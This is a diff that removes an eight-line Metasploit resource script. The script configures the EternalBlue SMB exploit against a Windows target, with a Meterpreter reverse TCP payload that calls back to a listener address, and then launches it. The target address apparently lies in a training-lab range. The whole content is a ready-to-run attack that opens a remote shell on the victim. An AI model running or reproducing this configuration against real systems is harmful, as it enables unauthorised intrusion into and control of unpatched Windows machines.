@@ -1,8 +1,0 @@
-use exploit/multi/handler
-use exploit/windows/smb/ms17_010_eternalblue 
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set RHOST 10.10.234.174
-set LHOST 10.4.16.77
-set AutoRunScript multiscript -rc auto.rc
-exploit
-exit -y
